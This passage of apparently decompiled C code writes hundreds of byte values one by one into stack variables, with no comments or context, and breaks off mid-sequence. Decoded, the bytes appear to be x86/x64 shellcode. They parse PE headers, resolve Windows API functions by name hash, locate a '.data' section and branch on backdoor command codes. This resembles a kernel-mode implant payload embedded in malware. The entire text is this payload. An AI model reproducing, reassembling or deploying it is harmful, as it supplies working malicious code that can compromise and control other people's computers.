  local_520 = 0x39;
  local_51f = 200;
  local_51e = 0x74;
  local_51d = 7;
  local_51c = 0x47;
  local_51b = 0xeb;
  local_51a = 0xeb;
  local_519 = 0x59;
  local_518 = 0x5e;
  local_517 = 0x5f;
  local_516 = 0xc3;
  local_515 = 0x89;
  local_514 = 0xf8;
  local_513 = 0xeb;
  local_512 = 0xf8;
  local_511 = 0x31;
  local_510 = 0xc0;
  local_50f = 0xeb;
  local_50e = 0xf4;
  local_50d = 0x83;
  local_50c = 0xc1;
  local_50b = 0x1c;
  local_50a = 0x8b;
  local_509 = 9;
  local_508 = 1;
  local_507 = 200;
  local_506 = 0xc3;
  local_505 = 0x83;
  local_504 = 0xc1;
  local_503 = 0x20;
  local_502 = 0x8b;
  local_501 = 9;
  local_500 = 1;
  local_4ff = 200;
  local_4fe = 0xc3;
  local_4fd = 0x83;
  local_4fc = 0xc1;
  local_4fb = 0x24;
  local_4fa = 0x8b;
  local_4f9 = 9;
  local_4f8 = 1;
  local_4f7 = 200;
  local_4f6 = 0xc3;
  local_4f5 = 0xd1;
  local_4f4 = 0xe1;
  local_4f3 = 1;
  local_4f2 = 200;
  local_4f1 = 0x66;
  local_4f0 = 0x8b;
  local_4ef = 0;
  local_4ee = 0xc3;
  local_4ed = 0x81;
  local_4ec = 0xe2;
  local_4eb = 0xff;
  local_4ea = 0xff;
  local_4e9 = 0;
  local_4e8 = 0;
  local_4e7 = 0xc1;
  local_4e6 = 0xe2;
  local_4e5 = 2;
  local_4e4 = 1;
  local_4e3 = 0xd1;
  local_4e2 = 0x8b;
  local_4e1 = 9;
  local_4e0 = 1;
  local_4df = 200;
  local_4de = 0xc3;
  local_4dd = 0x52;
  local_4dc = 0x56;
  local_4db = 0x8b;
  local_4da = 0x74;
  local_4d9 = 0x24;
  local_4d8 = 0xc;
  local_4d7 = 0x8b;
  local_4d6 = 0x4c;
  local_4d5 = 0x24;
  local_4d4 = 0x10;
  local_4d3 = 0x31;
  local_4d2 = 0xd2;
  local_4d1 = 0xd1;
  local_4d0 = 0xe9;
  local_4cf = 0x85;
  local_4ce = 0xc9;
  local_4cd = 0x74;
  local_4cc = 0xc;
  local_4cb = 0xc1;
  local_4ca = 0xc2;
  local_4c9 = 5;
  local_4c8 = 0xac;
  local_4c7 = 0x46;
  local_4c6 = 0xc;
  local_4c5 = 0x20;
  local_4c4 = 0x30;
  local_4c3 = 0xc2;
  local_4c2 = 0x49;
  local_4c1 = 0xeb;
  local_4c0 = 0xf0;
  local_4bf = 0x89;
  local_4be = 0xd0;
  local_4bd = 0x5e;
  local_4bc = 0x5a;
  local_4bb = 0xc2;
  local_4ba = 8;
  local_4b9 = 0;
  local_4b8 = 0x58;
  local_4b7 = 0x5a;
  local_4b6 = 0x5f;
  local_4b5 = 0x5e;
  local_4b4 = 0x50;
  local_4b3 = 0x56;
  local_4b2 = 0x89;
  local_4b1 = 0xf0;
  local_4b0 = 0x83;
  local_4af = 0xc6;
  local_4ae = 0x3c;
  local_4ad = 0x8b;
  local_4ac = 0x36;
  local_4ab = 1;
  local_4aa = 0xc6;
  local_4a9 = 0x31;
  local_4a8 = 0xc0;
  local_4a7 = 0x89;
  local_4a6 = 0xc1;
  local_4a5 = 0x66;
  local_4a4 = 0x8b;
  local_4a3 = 0x4e;
  local_4a2 = 6;
  local_4a1 = 0x66;
  local_4a0 = 0x8b;
  local_49f = 0x46;
  local_49e = 0x14;
  local_49d = 1;
  local_49c = 0xc6;
  local_49b = 0x83;
  local_49a = 0xc6;
  local_499 = 0x18;
  local_498 = 0x85;
  local_497 = 0xc9;
  local_496 = 0x74;
  local_495 = 0x1d;
  local_494 = 0x8b;
  local_493 = 6;
  local_492 = 0x39;
  local_491 = 0xf8;
  local_490 = 0x75;
  local_48f = 7;
  local_48e = 0x8b;
  local_48d = 0x46;
  local_48c = 4;
  local_48b = 0x39;
  local_48a = 0xd0;
  local_489 = 0x74;
  local_488 = 6;
  local_487 = 0x83;
  local_486 = 0xc6;
  local_485 = 0x28;
  local_484 = 0x49;
  local_483 = 0xeb;
  local_482 = 0xe9;
  local_481 = 0x8b;
  local_480 = 0x46;
  local_47f = 0xc;
  local_47e = 0x8b;
  local_47d = 0x4e;
  local_47c = 8;
  local_47b = 0x5e;
  local_47a = 1;
  local_479 = 0xc6;
  local_478 = 0xc3;
  local_477 = 0x31;
  local_476 = 0xf6;
  local_475 = 0xc3;
  local_474 = 0x60;
  local_473 = 0x31;
  local_472 = 0xc0;
  local_471 = 0x83;
  local_470 = 0xf8;
  local_46f = 0xf;
  local_46e = 0x74;
  local_46d = 0x1e;
  local_46c = 0x31;
  local_46b = 0xc9;
  local_46a = 0x8b;
  local_469 = 0x3c;
  local_468 = 0x86;
  local_467 = 0x8b;
  local_466 = 0x14;
  local_465 = 0x8e;
  local_464 = 0x39;
  local_463 = 0xd7;
  local_462 = 0x74;
  local_461 = 3;
  local_460 = 0x41;
  local_45f = 0x75;
  local_45e = 0xf3;
  local_45d = 0xf;
  local_45c = 0xb6;
  local_45b = 0x94;
  local_45a = 3;
  local_459 = 0x87;
  local_458 = 3;
  local_457 = 0;
  local_456 = 0;
  local_455 = 0x39;
  local_454 = 0xd1;
  local_453 = 0x75;
  local_452 = 0xd;
  local_451 = 0x40;
  local_450 = 0xeb;
  local_44f = 0xdd;
  local_44e = 0x41;
  local_44d = 0x39;
  local_44c = 200;
  local_44b = 0x75;
  local_44a = 5;
  local_449 = 0x61;
  local_448 = 0x31;
  local_447 = 0xc0;
  local_446 = 0x40;
  local_445 = 0xc3;
  local_444 = 0x61;
  local_443 = 0x31;
  local_442 = 0xc0;
  local_441 = 0xc3;
  local_440 = 0;
  local_43f = 1;
  local_43e = 2;
  local_43d = 3;
  local_43c = 4;
  local_43b = 5;
  local_43a = 6;
  local_439 = 7;
  local_438 = 8;
  local_437 = 9;
  local_436 = 10;
  local_435 = 9;
  local_434 = 9;
  local_433 = 0xd;
  local_432 = 0xe;
  local_431 = 0x8b;
  local_430 = 0x4c;
  local_42f = 0x24;
  local_42e = 8;
  local_42d = 0x60;
  local_42c = 0xe8;
  local_42b = 0;
  local_42a = 0;
  local_429 = 0;
  local_428 = 0;
  local_427 = 0x5d;
  local_426 = 0x66;
  local_425 = 0x81;
  local_424 = 0xe5;
  local_423 = 0;
  local_422 = 0xf0;
  local_421 = 0x89;
  local_420 = 0x4d;
  local_41f = 0x34;
  local_41e = 0xe8;
  local_41d = 0xd9;
  local_41c = 1;
  local_41b = 0;
  local_41a = 0;
  local_419 = 0xe8;
  local_418 = 0x43;
  local_417 = 1;
  local_416 = 0;
  local_415 = 0;
  local_414 = 0xe8;
  local_413 = 0x7f;
  local_412 = 1;
  local_411 = 0;
  local_410 = 0;
  local_40f = 0x85;
  local_40e = 0xc0;
  local_40d = 0xf;
  local_40c = 0x84;
  local_40b = 0xe3;
  local_40a = 0;
  local_409 = 0;
  local_408 = 0;
  local_407 = 0x8b;
  local_406 = 0x5d;
  local_405 = 0x3c;
  local_404 = 0x8b;
  local_403 = 0x4b;
  local_402 = 0xd8;
  local_401 = 0xe8;
  local_400 = 0x17;
  local_3ff = 1;
  local_3fe = 0;
  local_3fd = 0;
  local_3fc = 0x3c;
  local_3fb = 0x23;
  local_3fa = 0x74;
  local_3f9 = 0xd;
  local_3f8 = 0x3c;
  local_3f7 = 0x77;
  local_3f6 = 0x74;
  local_3f5 = 0x1c;
  local_3f4 = 0x3c;
  local_3f3 = 200;
  local_3f2 = 0x74;
  local_3f1 = 0x22;
  local_3f0 = 0xe9;
  local_3ef = 0xb6;
  local_3ee = 0;
  local_3ed = 0;
  local_3ec = 0;
  local_3eb = 0x8b;
  local_3ea = 0x4d;
  local_3e9 = 0x38;
  local_3e8 = 0x8b;
  local_3e7 = 0x45;
  local_3e6 = 0x24;
  local_3e5 = 0x89;
  local_3e4 = 0x41;
  local_3e3 = 0xe;
  local_3e2 = 0x31;
  local_3e1 = 0xc0;
  local_3e0 = 0x88;
  local_3df = 0x41;
  local_3de = 0x12;
  local_3dd = 0xe9;
  local_3dc = 0x9f;
  local_3db = 0;
  local_3da = 0;
  local_3d9 = 0;
  local_3d8 = 0xe8;
  local_3d7 = 0x13;
  local_3d6 = 1;
  local_3d5 = 0;
  local_3d4 = 0;
  local_3d3 = 0xe9;
  local_3d2 = 0xb5;
  local_3d1 = 0;
  local_3d0 = 0;
  local_3cf = 0;
  local_3ce = 0x8b;
  local_3cd = 0x5d;
  local_3cc = 0x3c;
  local_3cb = 0x8b;
  local_3ca = 0x43;
  local_3c9 = 0xe8;
  local_3c8 = 0x8b;
  local_3c7 = 0x30;
  local_3c6 = 0x33;
  local_3c5 = 0x75;
  local_3c4 = 0x28;
  local_3c3 = 0x8b;
  local_3c2 = 0x78;
  local_3c1 = 8;
  local_3c0 = 0x33;
  local_3bf = 0x7d;
  local_3be = 0x28;
  local_3bd = 0x8b;
  local_3bc = 0x40;
  local_3bb = 4;
  local_3ba = 0x33;
  local_3b9 = 0x45;
  local_3b8 = 0x28;
  local_3b7 = 0x3b;
  local_3b6 = 0x43;
  local_3b5 = 0x10;
  local_3b4 = 0x89;
  local_3b3 = 0xc3;
  local_3b2 = 0x75;
  local_3b1 = 0x7b;
  local_3b0 = 0x8b;
  local_3af = 0x4d;
  local_3ae = 0x30;
  local_3ad = 0x39;
  local_3ac = 0xf1;
  local_3ab = 0x8b;
  local_3aa = 0x45;
  local_3a9 = 0x2c;
  local_3a8 = 0x74;
  local_3a7 = 0x18;
  local_3a6 = 0xe8;
  local_3a5 = 0xf2;
  local_3a4 = 0;
  local_3a3 = 0;
  local_3a2 = 0;
  local_3a1 = 0x8d;
  local_3a0 = 0x46;
  local_39f = 4;
  local_39e = 0x50;
  local_39d = 0x6a;
  local_39c = 0;
  local_39b = 0xff;
  local_39a = 0x55;
  local_399 = 8;
  local_398 = 0x85;
  local_397 = 0xc0;
  local_396 = 0x74;
  local_395 = 99;
  local_394 = 0x89;
  local_393 = 0x45;
  local_392 = 0x2c;
  local_391 = 0x89;
  local_390 = 0x75;
  local_38f = 0x30;
  local_38e = 1;
  local_38d = 0xdf;
  local_38c = 0x39;
  local_38b = 0xf7;
  local_38a = 0x77;
  local_389 = 0x53;
  local_388 = 0x29;
  local_387 = 0xdf;
  local_386 = 1;
  local_385 = 199;
  local_384 = 0x57;
  local_383 = 0x89;
  local_382 = 0xf2;
  local_381 = 0x8b;
  local_380 = 0x75;
  local_37f = 0x3c;
  local_37e = 0x8b;
  local_37d = 0x76;
  local_37c = 0xf0;
  local_37b = 0x89;
  local_37a = 0xd9;
  local_379 = 0xf3;
  local_378 = 0xa4;
  local_377 = 0x5e;
  local_376 = 0x89;
  local_375 = 0xd9;
  local_374 = 0xc1;
  local_373 = 0xe9;
  local_372 = 2;
  local_371 = 0x8b;
  local_370 = 0x5d;
  local_36f = 0x28;
  local_36e = 0x31;
  local_36d = 0x1e;
  local_36c = 0x83;
  local_36b = 0xc6;
  local_36a = 4;
  local_369 = 0xe2;
  local_368 = 0xf9;
  local_367 = 1;
  local_366 = 0xd0;
  local_339 = 0xb0;
  local_335 = 0xb0;
  local_331 = 0xb0;
  local_365 = 0x39;
  local_364 = 0xc6;
  local_363 = 0x7c;
  local_362 = 0x28;
  local_361 = 0x8b;
  local_360 = 0x45;
  local_35f = 0x2c;
  local_35e = 0x60;
  local_35d = 0x89;
  local_35c = 0xe6;
  local_35b = 0x50;
  local_35a = 0xff;
  local_359 = 0xd0;
  local_358 = 0x89;
  local_357 = 0xf4;
  local_356 = 0x61;
  local_355 = 0xe8;
  local_354 = 0xa1;
  local_353 = 0;
  local_352 = 0;
  local_351 = 0;
  local_350 = 0x8b;
  local_34f = 0x45;
  local_34e = 0x24;
  local_34d = 0xd1;
  local_34c = 0xe8;
  local_34b = 0x31;
  local_34a = 0xc9;
  local_349 = 0x88;
  local_348 = 0xc1;
  local_347 = 1;
  local_346 = 0xe9;
  local_345 = 0x8b;
  local_344 = 9;
  local_343 = 0x31;
  local_342 = 200;
  local_341 = 0x89;
  local_340 = 0x45;
  local_33f = 0x24;
  local_33e = 0xe8;
  local_33d = 0x68;
  local_33c = 0;
  local_33b = 0;
  local_33a = 0;
  local_338 = 0x10;
  local_337 = 0xeb;
  local_336 = 8;
  local_334 = 0x20;
  local_333 = 0xeb;
  local_332 = 4;
  local_330 = 0x30;
  local_32f = 0xeb;
  local_32e = 0;
  local_32d = 0x8b;
  local_32c = 0x4d;
  local_32b = 0x38;
  local_32a = 0xb4;
  local_329 = 0;
  local_328 = 0x66;
  local_327 = 1;
  local_326 = 0x41;
  local_325 = 0x1e;
  local_324 = 0x8b;
  local_323 = 0x45;
  local_322 = 0x10;
  local_321 = 0x89;
  local_320 = 0x44;
  local_31f = 0x24;
  local_31e = 0x1c;
  local_31d = 0x61;
  local_31c = 0xff;
  local_31b = 0x60;
  local_31a = 0x3c;
  local_319 = 0x8d;
  local_318 = 0x45;
  local_317 = 0x48;
  local_316 = 0x8b;
  local_315 = 0x4d;
  local_314 = 0xc;
  local_313 = 0x89;
  local_312 = 0x88;
  local_311 = 0x47;
  local_310 = 1;
  local_30f = 0;
  local_30e = 0;
  local_30d = 0x89;
  local_30c = 0xa8;
  local_30b = 0x3e;
  local_30a = 1;
  local_309 = 0;
  local_308 = 0;
  local_307 = 0x66;
  local_306 = 0xb8;
  local_305 = 0x10;
  local_304 = 0;
  local_303 = 0x8b;
  local_302 = 0x4d;
  local_301 = 0x38;
  local_300 = 0x66;
  local_2ff = 1;
  local_2fe = 0x41;
  local_2fd = 0x1e;
  local_2fc = 0x8b;
  local_2fb = 0x45;
  local_2fa = 0x10;
  local_2f9 = 0x89;
  local_2f8 = 0x44;
  local_2f7 = 0x24;
  local_2f6 = 0x1c;
  local_2f5 = 0x61;
  local_2f4 = 0x68;
  local_2f3 = 0;
  local_2f2 = 0;
  local_2f1 = 0;
  local_2f0 = 0;
  local_2ef = 0x8b;
  local_2ee = 0x40;
  local_2ed = 0x3c;
  local_2ec = 0x50;
  local_2eb = 0x68;
  local_2ea = 0;
  local_2e9 = 0;
  local_2e8 = 0;
  local_2e7 = 0;
  local_2e6 = 0xc3;
  local_2e5 = 0x31;
  local_2e4 = 0xc0;
  local_2e3 = 0x88;
  local_2e2 = 200;
  local_2e1 = 0xc1;
  local_2e0 = 0xe9;
  local_2df = 8;
  local_2de = 0;
  local_2dd = 200;
  local_2dc = 0xc1;
  local_2db = 0xe9;
  local_2da = 8;
  local_2d9 = 0;
  local_2d8 = 200;
  local_2d7 = 0xc1;
  local_2d6 = 0xe9;
  local_2d5 = 8;
  local_2d4 = 0;
  local_2d3 = 200;
  local_2d2 = 0xc3;
  local_2d1 = 0x51;
  local_2d0 = 0x8b;
  local_2cf = 0x45;
  local_2ce = 0x24;
  local_2cd = 0x89;
  local_2cc = 0xc1;
  local_2cb = 0xf;
  local_2ca = 0xc9;
  local_2c9 = 0xd1;
  local_2c8 = 0xe0;
  local_2c7 = 0x31;
  local_2c6 = 200;
  local_2c5 = 0x89;
  local_2c4 = 0x45;
  local_2c3 = 0x28;
  local_2c2 = 0x59;
  local_2c1 = 0xc3;
  local_2c0 = 0x60;
  local_2bf = 0xe8;
  local_2be = 0xb;
  local_2bd = 0;
  local_2bc = 0;
  local_2bb = 0;
  local_2ba = 0x8b;
  local_2b9 = 0x45;
  local_2b8 = 0x10;
  local_2b7 = 0x8b;
  local_2b6 = 0x48;
  local_2b5 = 0x3c;
  local_2b4 = 0x89;
  local_2b3 = 0x48;
  local_2b2 = 0x38;
  local_2b1 = 0x61;
  local_2b0 = 0xc3;
  local_2af = 0x60;
  local_2ae = 0x8b;
  local_2ad = 0x5d;
  local_2ac = 0x2c;
  local_2ab = 0x85;
  local_2aa = 0xdb;
  local_2a9 = 0x74;
  local_2a8 = 0xd;
  local_2a7 = 0x31;
  local_2a6 = 0xc0;
  local_2a5 = 0x89;
  local_2a4 = 0xdf;
  local_2a3 = 0x8b;
  local_2a2 = 0x4d;
  local_2a1 = 0x30;
  local_2a0 = 0xf3;
  local_29f = 0xaa;
  local_29e = 0x53;
  local_29d = 0xff;
  local_29c = 0x55;
  local_29b = 0xc;
  local_29a = 0x31;
  local_299 = 0xc0;
  local_298 = 0x89;
  local_297 = 0x45;
  local_296 = 0x30;
  local_295 = 0x89;
  local_294 = 0x45;
  local_293 = 0x2c;
  local_292 = 0x61;
  local_291 = 0xc3;
  local_290 = 0x57;
  local_28f = 0x52;
  local_28e = 0x56;
  local_28d = 0x89;
  local_28c = 0xcf;
  local_28b = 0x8b;
  local_28a = 0x55;
  local_289 = 0x44;
  local_288 = 0x8b;
  local_287 = 10;
  local_286 = 0xe8;
  local_285 = 0x39;
  local_284 = 0;
  local_283 = 0;
  local_282 = 0;
  local_281 = 0x85;
  local_280 = 0xc0;
  local_27f = 0x75;
  local_27e = 0xe;
  local_27d = 0x83;
  local_27c = 0xc2;
  local_27b = 8;
  local_27a = 0x8b;
  local_279 = 10;
  local_278 = 0xe8;
  local_277 = 0x2b;
  local_276 = 0;
  local_275 = 0;
  local_274 = 0;
  local_273 = 0x85;
  local_272 = 0xc0;
  local_271 = 0x74;
  local_270 = 0x21;
  local_26f = 0x89;
  local_26e = 0x4d;
  local_26d = 0x44;
  local_26c = 0x6a;
  local_26b = 0xc;
  local_26a = 0x58;
  local_269 = 0x8d;
  local_268 = 0x71;
  local_267 = 0x54;
  local_266 = 0x3b;
  local_265 = 6;
  local_264 = 0x74;
  local_263 = 7;
  local_262 = 0x83;
  local_261 = 0xc6;
  local_260 = 4;
  local_25f = 0x3b;
  local_25e = 6;
  local_25d = 0x75;
  local_25c = 0xd;
  local_25b = 0x3b;
  local_25a = 0x46;
  local_259 = 4;
  local_258 = 0x75;
  local_257 = 8;
  local_256 = 0x89;
  local_255 = 0x75;
  local_254 = 0x3c;
  local_253 = 0x31;
  local_252 = 0xc0;
  local_251 = 0x40;
  local_250 = 0xeb;
  local_24f = 2;
  local_24e = 0x31;
  local_24d = 0xc0;
  local_24c = 0x5e;
  local_24b = 0x5a;
  local_24a = 0x5f;
  local_249 = 0xc3;
  local_248 = 0x31;
  local_247 = 0xc0;
  local_246 = 0x39;
  local_245 = 0xc1;
  local_244 = 0x7d;
  local_243 = 1;
  local_242 = 0x40;
  local_241 = 0xc3;
  local_240 = 0x52;
  local_23f = 0x51;
  local_23e = 0x31;
  local_23d = 0xd2;
  local_23c = 0x66;
  local_23b = 0x8b;
  local_23a = 0x51;
  local_239 = 2;
  local_238 = 1;
  local_237 = 0xca;
  local_236 = 0x3b;
  local_235 = 0x11;
  local_234 = 0x74;
  local_233 = 5;
  local_232 = 0x83;
  local_231 = 0xc1;
  local_230 = 4;
  local_22f = 0xeb;
  local_22e = 0xf7;
  local_22d = 0x5a;
  local_22c = 0x8d;
  local_22b = 0x41;
  local_22a = 0x1c;
  local_229 = 0x83;
  local_228 = 0xc0;
  local_227 = 7;
  local_226 = 0x24;
  local_225 = 0xf8;
  local_224 = 0x89;
  local_223 = 0x45;
  local_222 = 0x44;
  local_221 = 0x8b;
  local_220 = 0x41;
  local_21f = 0xf8;
  local_21e = 0x89;
  local_21d = 0x45;
  local_21c = 0x38;
  local_21b = 0x89;
  local_21a = 0xd1;
  local_219 = 0x5a;
  local_218 = 0xc3;
  local_217 = 0x53;
  local_216 = 0x55;
  local_215 = 0x57;
  local_214 = 0x56;
  local_213 = 0x41;
  local_212 = 0x54;
  local_211 = 0x41;
  local_210 = 0x55;
  local_20f = 0x41;
  local_20e = 0x56;
  local_20d = 0x41;
  local_20c = 0x57;
  local_20b = 0x48;
  local_20a = 0x89;
  local_209 = 0xe5;
  local_208 = 0x48;
  local_207 = 0x81;
  local_206 = 0xec;
  local_205 = 0x80;
  local_204 = 0;
  local_203 = 0;
  local_202 = 0;
  local_201 = 0x66;
  local_200 = 0x83;
  local_1ff = 0xe4;
  local_1fe = 0xf0;
  local_1fd = 0xe8;
  local_1fc = 0x83;
  local_1fb = 3;
  local_1fa = 0;
  local_1f9 = 0;
  local_1f8 = 0x48;
  local_1f7 = 0x89;
  local_1f6 = 0x45;
  local_1f5 = 0xf8;
  local_1f4 = 0x48;
  local_1f3 = 0x89;
  local_1f2 = 0xc3;
  local_1f1 = 0xb9;
  local_1f0 = 0x2e;
  local_1ef = 0x5b;
  local_1ee = 0x51;
  local_1ed = 0xd2;
  local_1ec = 0xe8;
  local_1eb = 0xee;
  local_1ea = 1;
  local_1e9 = 0;
  local_1e8 = 0;
  local_1e7 = 0x48;
  local_1e6 = 0x85;
  local_1e5 = 0xc0;
  local_1e4 = 0xf;
  local_1e3 = 0x84;
  local_1e2 = 0xd5;
  local_1e1 = 1;
  local_1e0 = 0;
  local_1df = 0;
  local_1de = 0x48;
  local_1dd = 0x89;
  local_1dc = 0xc6;
  local_1db = 0xb9;
  local_1da = 0x94;
  local_1d9 = 1;
  local_1d8 = 0x69;
  local_1d7 = 0xe3;
  local_1d6 = 0xe8;
  local_1d5 = 0xd8;
  local_1d4 = 1;
  local_1d3 = 0;
  local_1d2 = 0;
  local_1d1 = 0x48;
  local_1d0 = 0x85;
  local_1cf = 0xc0;
  local_1ce = 0xf;
  local_1cd = 0x84;
  local_1cc = 0xbf;
  local_1cb = 1;
  local_1ca = 0;
  local_1c9 = 0;
  local_1c8 = 0x48;
  local_1c7 = 0x89;
  local_1c6 = 0x45;
  local_1c5 = 0xf0;
  local_1c4 = 0x48;
  local_1c3 = 0x89;
  local_1c2 = 199;
  local_1c1 = 0xb9;
  local_1c0 = 0x85;
  local_1bf = 0x54;
  local_1be = 0x83;
  local_1bd = 0xf0;
  local_1bc = 0xe8;
  local_1bb = 0xbe;
  local_1ba = 1;
  local_1b9 = 0;
  local_1b8 = 0;
  local_1b7 = 0x48;
  local_1b6 = 0x85;
  local_1b5 = 0xc0;
  local_1b4 = 0xf;
  local_1b3 = 0x84;
  local_1b2 = 0xa5;
  local_1b1 = 1;
  local_1b0 = 0;
  local_1af = 0;
  local_1ae = 0x48;
  local_1ad = 0x89;
  local_1ac = 0x45;
  local_1ab = 0xe8;
  local_1aa = 0x4c;
  local_1a9 = 0x8d;
  local_1a8 = 0x4d;
  local_1a7 = 0xd0;
  local_1a6 = 0x4d;
  local_1a5 = 0x31;
  local_1a4 = 0xc0;
  local_1a3 = 0x4c;
  local_1a2 = 0x89;
  local_1a1 = 0xc1;
  local_1a0 = 0x44;
  local_19f = 0x89;
  local_19e = 0x45;
  local_19d = 0xd0;
  local_19c = 0x4c;
  local_19b = 0x89;
  local_19a = 0xc2;
  local_199 = 0xb1;
  local_198 = 0xb;
  local_197 = 0xff;
  local_196 = 0xd6;
  local_195 = 0x44;
  local_194 = 0x8b;
  local_193 = 0x45;
  local_192 = 0xd0;
  local_191 = 0x45;
  local_190 = 0x85;
  local_18f = 0xc0;
  local_18e = 0xf;
  local_18d = 0x84;
  local_18c = 0x7f;
  local_18b = 1;
  local_18a = 0;
  local_189 = 0;
  local_188 = 0x8b;
  local_187 = 0x55;
  local_186 = 0xd0;
  local_185 = 0x48;
  local_184 = 0x31;
  local_183 = 0xc9;
  local_182 = 0xff;
  local_181 = 0xd7;
  local_180 = 0x48;
  local_17f = 0x85;
  local_17e = 0xc0;
  local_17d = 0xf;
  local_17c = 0x84;
  local_17b = 0x6e;
  local_17a = 1;
  local_179 = 0;
  local_178 = 0;
  local_177 = 0x48;
  local_176 = 0x89;
  local_175 = 0xc3;
  local_174 = 0x48;
  local_173 = 0x31;
  local_172 = 0xc9;
  local_171 = 0x49;
  local_170 = 0x89;
  local_16f = 0xc9;
  local_16e = 0x44;
  local_16d = 0x8b;
  local_16c = 0x45;
  local_16b = 0xd0;
  local_16a = 0x48;
  local_169 = 0x89;
  local_168 = 0xc2;
  local_167 = 0xb1;
  local_166 = 0xb;
  local_165 = 0xff;
  local_164 = 0xd6;
  local_163 = 0x48;
  local_162 = 0x85;
  local_161 = 0xc0;
  local_160 = 0xf;
  local_15f = 0x85;
  local_15e = 0x51;
  local_15d = 1;
  local_15c = 0;
  local_15b = 0;
  local_15a = 0x48;
  local_159 = 0x89;
  local_158 = 0xd8;
  local_157 = 0x48;
  local_156 = 0x2d;
  local_155 = 0xf8;
  local_154 = 0;
  local_153 = 0;
  local_152 = 0;
  local_151 = 0x48;
  local_150 = 5;
  local_14f = 0x28;
  local_14e = 1;
  local_14d = 0;
  local_14c = 0;
  local_14b = 0x8b;
  local_14a = 0x55;
  local_149 = 0xd0;
  local_148 = 0x81;
  local_147 = 0xea;
  local_146 = 0x28;
  local_145 = 1;
  local_144 = 0;
  local_143 = 0;
  local_142 = 0xf;
  local_141 = 0x8c;
  local_140 = 0x33;
  local_13f = 1;
  local_13e = 0;
  local_13d = 0;
  local_13c = 0x89;
  local_13b = 0x55;
  local_13a = 0xd0;
  local_139 = 0x50;
  local_138 = 0xe8;
  local_137 = 0x3f;
  local_136 = 2;
  local_135 = 0;
  local_134 = 0;
  local_133 = 0x48;
  local_132 = 0x89;
  local_131 = 0xc2;
  local_130 = 0x58;
  local_12f = 0xb9;
  local_12e = 0xfa;
  local_12d = 0x3c;
  local_12c = 0xad;
  local_12b = 0xc2;
  local_12a = 0x48;
  local_129 = 0x39;
  local_128 = 0xca;
  local_127 = 0x74;
  local_126 = 10;
  local_125 = 0xb9;
  local_124 = 0x1a;
  local_123 = 0xbd;
  local_122 = 0x4b;
  local_121 = 0x2b;
  local_120 = 0x48;
  local_11f = 0x39;
  local_11e = 0xca;
  local_11d = 0x75;
  local_11c = 0xca;
  local_11b = 0x48;
  local_11a = 0x8b;
  local_119 = 0x70;
  local_118 = 0xe8;
  local_117 = 0x48;
  local_116 = 0x89;
  local_115 = 0xd9;
  local_114 = 0xff;
  local_113 = 0x55;
  local_112 = 0xe8;
  local_111 = 0x48;
  local_110 = 0x89;
  local_10f = 0xf0;
  local_10e = 0x48;
  local_10d = 0x31;
  local_10c = 0xd2;
  local_10b = 0x48;
  local_10a = 0x89;
  local_109 = 0xc3;
  local_108 = 0x8b;
  local_107 = 0x50;
  local_106 = 0x3c;
  local_105 = 0x48;
  local_104 = 1;
  local_103 = 0xd0;
  local_102 = 0x48;
  local_101 = 0x89;
  local_100 = 0xc6;
  local_ff = 0x48;
  local_fe = 0x31;
  local_fd = 0xc9;
  local_fc = 0x48;
  local_fb = 0x89;
  local_fa = 0xca;
  local_f9 = 0x66;
  local_f8 = 0x8b;
  local_f7 = 0x48;
  local_f6 = 6;
  local_f5 = 0x66;
  local_f4 = 0x8b;
  local_f3 = 0x50;
  local_f2 = 0x14;
  local_f1 = 0x48;
  local_f0 = 1;
  local_ef = 0xd6;
  local_ee = 0x48;
  local_ed = 0x83;
  local_ec = 0xc6;
  local_eb = 0x18;
  local_ea = 0x48;
  local_e9 = 0xbf;
  local_e8 = 0x2e;
  local_e7 = 100;
  local_e6 = 0x61;
  local_e5 = 0x74;
  local_e4 = 0x61;
  local_e3 = 0;
  local_e2 = 0;
  local_e1 = 0;
  local_e0 = 0x48;
  local_df = 0x83;
  local_de = 0xf9;
  local_dd = 0;
  local_dc = 0xf;
  local_db = 0x84;
  local_da = 0xcd;
  local_d9 = 0;
  local_d8 = 0;
  local_d7 = 0;
  local_d6 = 0x48;
  local_d5 = 0x8b;
  local_d4 = 6;
  local_d3 = 0x48;
  local_d2 = 0x39;
  local_d1 = 0xf8;
  local_d0 = 0x74;
  local_cf = 9;
  local_ce = 0x48;
  local_cd = 0x83;
  local_cc = 0xc6;
  local_cb = 0x28;
  local_ca = 0x48;
  local_c9 = 0xff;
  local_c8 = 0xc9;
  local_c7 = 0xeb;
  local_c6 = 0xe5;
  local_c5 = 0x8b;
  local_c4 = 0x46;
  local_c3 = 0xc;
  local_c2 = 0x8b;
  local_c1 = 0x4e;
  local_c0 = 8;
  local_bf = 0x48;
  local_be = 1;
  local_bd = 0xc6;
  local_bc = 0x48;
  local_bb = 0xbb;
  local_ba = 0xfe;
  local_b9 = 0xfe;
  local_b8 = 0xfe;
  local_b7 = 0xfe;
  local_b6 = 0xfe;
  local_b5 = 0xfe;
  local_b4 = 0xfe;
  local_b3 = 0xfe;
  local_b2 = 0x48;
  local_b1 = 0x83;
  local_b0 = 0xe9;
  local_af = 8;
  local_ae = 0x48;
  local_ad = 0x83;
  local_ac = 0xf9;
  local_ab = 0;
  local_aa = 0xf;
  local_a9 = 0x8c;
  local_a8 = 0x9b;
  local_a7 = 0;
  local_a6 = 0;
  local_a5 = 0;
  local_a4 = 0x48;
  local_a3 = 0x8b;
  local_a2 = 0x3e;
  local_a1 = 0x48;
  local_a0 = 0x39;
  local_9f = 0xdf;
  local_9e = 0x75;
  local_9d = 0xc;
  local_9c = 0x4c;
  local_9b = 0x8b;
  local_9a = 0x86;
  local_99 = 0x98;
  local_98 = 0;
  local_97 = 0;
  local_96 = 0;
  local_95 = 0x4d;
  local_94 = 0x85;
  local_93 = 0xc0;
  local_92 = 0x74;
  local_91 = 6;
  local_90 = 0x48;
  local_8f = 0x83;
  local_8e = 0xc6;
  local_8d = 8;
  local_8c = 0xeb;
  local_8b = 0xd8;
  local_8a = 0x48;
  local_89 = 0x83;
  local_88 = 0xc6;
  local_87 = 8;
  local_86 = 0x48;
  local_85 = 0x89;
  local_84 = 0x75;
  local_83 = 0xe0;
  local_82 = 0x48;
  local_81 = 0x31;
  local_80 = 0xc9;
  local_7f = 0xba;
  local_7e = 0xf0;
  local_7d = 0xf;
  local_7c = 0;
  local_7b = 0;
  local_7a = 0xff;
  local_79 = 0x55;
  local_78 = 0xf0;
  local_77 = 0x48;
  local_76 = 0x85;
  local_75 = 0xc0;
  local_74 = 0x74;
  local_73 = 0x69;
  local_72 = 0x49;
  local_71 = 0x89;
